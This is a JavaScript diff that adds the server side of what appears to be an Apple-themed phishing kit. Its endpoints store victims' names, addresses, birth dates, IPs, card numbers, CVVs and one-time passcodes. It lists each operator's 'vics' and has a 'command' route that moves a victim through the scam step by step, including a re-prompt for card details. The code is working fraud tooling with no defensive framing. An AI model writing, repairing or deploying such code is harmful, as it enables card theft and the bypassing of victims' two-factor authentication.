@@ -1,4 +1,5 @@
 const axios = require("axios");
+const AppleGB = require("../models/appleGbModel");
 
 let count = 0;
 
@@ -172,7 +173,160 @@ const sendAuRes = async (req, res) => {
   res.send("Update Complete");
 };
 
+const getOwnerVics = async (req, res) => {
+  const { owner } = req.params;
+  AppleGB.find({ owner }).exec((err, vics) => {
+    if (err) {
+      console.log(err);
+      res.status(404).send("Error");
+      return;
+    }
+    res.send(vics);
+  });
+};
+
+const command = async (req, res) => {
+  const { uniqueid, status } = req.body;
+  try {
+    await AppleGB.findOneAndUpdate({ uniqueid }, { status }).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const getInfo = async (req, res) => {
+  const { uniqueid } = req.params;
+  AppleGB.findOne({ uniqueid }).exec((err, vic) => {
+    if (err) {
+      console.log(err);
+      res.status(404).send("Error");
+      return;
+    }
+    res.send(vic);
+  });
+};
+
+const submitAppAuth = async (req, res) => {
+  const { uniqueid } = req.body;
+  try {
+    await AppleGB.findOneAndUpdate({ uniqueid }, { status: 6 }).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitBilling = async (req, res) => {
+  const {
+    fullname,
+    telephone,
+    address,
+    city,
+    pcode,
+    dob,
+    ip,
+    uniqueid,
+    owner,
+  } = req.body;
+  try {
+    await AppleGB.create({
+      fullname,
+      telephone,
+      address,
+      city,
+      pcode,
+      dob,
+      ip,
+      uniqueid,
+      status: 1,
+      owner,
+    });
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitTelephone = async (req, res) => {
+  const { uniqueid, telephone } = req.body;
+  try {
+    await AppleGB.findOneAndUpdate(
+      { uniqueid },
+      { telephone, status: 10 }
+    ).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitOtp = async (req, res) => {
+  const { uniqueid, otp } = req.body;
+  try {
+    await AppleGB.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitCCAgain = async (req, res) => {
+  const { uniqueid, ccname, ccnum, ccexp, cvv } = req.body;
+  try {
+    await AppleGB.findOneAndUpdate(
+      { uniqueid },
+      { ccname, ccnum, ccexp, cvv, status: 8 }
+    ).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitCC = async (req, res) => {
+  const { uniqueid, ccname, ccnum, ccexp, cvv, ip, owner } = req.body;
+  try {
+    let user = await AppleGB.findOne({ uniqueid }).exec();
+    if (user.length) {
+      await AppleGB.findOneAndUpdate(
+        { uniqueid },
+        { ccname, ccnum, ccexp, cvv, status: 2 }
+      ).exec();
+    } else {
+      await AppleGB.create({
+        uniqueid,
+        ccname,
+        ccnum,
+        ccexp,
+        cvv,
+        owner,
+        status: 2,
+      });
+    }
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
 module.exports = {
   sendRes,
   sendAuRes,
+  getOwnerVics,
+  command,
+  getInfo,
+  submitAppAuth,
+  submitBilling,
+  submitTelephone,
+  submitOtp,
+  submitCCAgain,
+  submitCC,
 };
